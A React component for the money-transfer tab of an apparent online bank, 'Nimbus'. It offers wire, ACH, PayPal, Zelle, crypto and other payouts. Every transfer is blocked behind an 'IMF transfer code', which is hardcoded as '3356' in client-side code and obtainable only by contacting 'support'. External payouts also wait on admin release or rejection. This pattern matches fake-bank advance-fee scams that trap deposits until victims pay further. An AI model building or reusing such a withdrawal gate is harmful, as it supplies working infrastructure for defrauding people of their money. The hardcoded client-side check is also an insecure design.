import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Send } from "lucide-react";

const METHODS = [
  { id: "internal", label: "Nimbus account (instant)", fields: [] as string[] },
  { id: "wire", label: "Wire transfer", fields: ["Bank name", "Routing number", "Account number", "Account holder"] },
  { id: "ach", label: "ACH", fields: ["Bank name", "Routing number", "Account number"] },
  { id: "paypal", label: "PayPal", fields: ["PayPal email"] },
  { id: "cashapp", label: "Cash App", fields: ["$Cashtag"] },
  { id: "zelle", label: "Zelle", fields: ["Zelle email or phone"] },
  { id: "applepay", label: "Apple Pay", fields: ["Apple Pay email"] },
  { id: "crypto", label: "Crypto (BTC/ETH/USDT)", fields: ["Network", "Wallet address"] },
  { id: "other", label: "Other", fields: ["Details"] },
] as const;

type MethodId = (typeof METHODS)[number]["id"];

export function TransferTab() {
  const [method, setMethod] = useState<MethodId>("internal");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("");
  const [note, setNote] = useState("");
  const [details, setDetails] = useState<Record<string, string>>({});
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const meta = METHODS.find((m) => m.id === method)!;

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    const amt = Number(amount);
    if (!amt || amt <= 0) return toast.error("Enter a valid amount");
    if (code.trim() !== "3356") return toast.error("Invalid IMF code — contact support to obtain your transfer code");
    setLoading(true);

    const summary = meta.fields.map((f) => `${f}: ${details[f] || ""}`).join(", ");
    const destination = { ...details, summary };

    const { error } = await supabase.rpc("send_payment", {
      _method: method,
      _amount: amt,
      _destination: destination,
      _to_email: method === "internal" ? email : "",
      _note: note || "",
    });
    setLoading(false);
    if (error) return toast.error(error.message);
    toast.success(method === "internal" ? `Sent $${amt.toFixed(2)}` : `Payout of $${amt.toFixed(2)} submitted — pending review`);
    setEmail(""); setAmount(""); setNote(""); setDetails({}); setCode("");
  }

  return (
    <div className="mx-auto max-w-lg">
      <div className="glass rounded-2xl p-6">
        <div className="mb-5 flex items-center gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-xl" style={{ background: "var(--gradient-brand)" }}>
            <Send className="h-5 w-5 text-primary-foreground" />
          </div>
          <div>
            <h2 className="text-lg font-semibold">Send money</h2>
            <p className="text-xs text-muted-foreground">Wire, ACH, PayPal, Cash App, Zelle, Apple Pay, crypto or Nimbus</p>
          </div>
        </div>
        <form onSubmit={submit} className="space-y-4">
          <Field label="Method">
            <select value={method} onChange={(e) => { setMethod(e.target.value as MethodId); setDetails({}); }} className="input">
              {METHODS.map((m) => <option key={m.id} value={m.id}>{m.label}</option>)}
            </select>
          </Field>

          {method === "internal" && (
            <Field label="Recipient email">
              <input required type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="input" placeholder="friend@example.com" />
            </Field>
          )}

          {meta.fields.map((f) => (
            <Field key={f} label={f}>
              <input required value={details[f] || ""} onChange={(e) => setDetails({ ...details, [f]: e.target.value })} className="input" placeholder={f} />
            </Field>
          ))}

          <Field label="Amount (USD)">
            <input required type="number" min="0.01" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="input" placeholder="0.00" />
          </Field>
          <Field label="Note (optional)">
            <input value={note} onChange={(e) => setNote(e.target.value)} className="input" placeholder="Dinner, rent…" maxLength={140} />
          </Field>
          <Field label="IMF transfer code">
            <input required inputMode="numeric" maxLength={4} value={code} onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))} className="input tracking-[0.4em]" placeholder="••••" />
          </Field>
          <p className="-mt-2 text-xs text-muted-foreground">Required for every transfer method — Nimbus, wire, ACH, PayPal, Cash App, Zelle, Apple Pay and crypto. Contact support if you don't have your code.</p>
          <button disabled={loading} className="w-full rounded-xl py-3 font-semibold text-primary-foreground shadow-glow transition hover:opacity-90 disabled:opacity-50" style={{ background: "var(--gradient-brand)" }}>
            {loading ? "Sending…" : method === "internal" ? "Send money" : "Submit payout"}
          </button>
          {method !== "internal" && (<p className="text-center text-xs text-muted-foreground">External payouts start as pending and can be released or rejected by an admin.</p>)}
        </form>
      </div>
      <style>{`.input{width:100%;padding:.75rem 1rem;border-radius:.75rem;background:var(--input);color:var(--foreground);border:1px solid var(--border);outline:none}.input:focus{border-color:var(--ring);box-shadow:0 0 0 3px oklch(0.82 0.16 195 / 0.2)}`}</style>
    </div>
  );
}
function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return <label className="block"><span className="mb-1.5 block text-xs font-medium uppercase tracking-wider text-muted-foreground">{label}</span>{children}</label>;
}
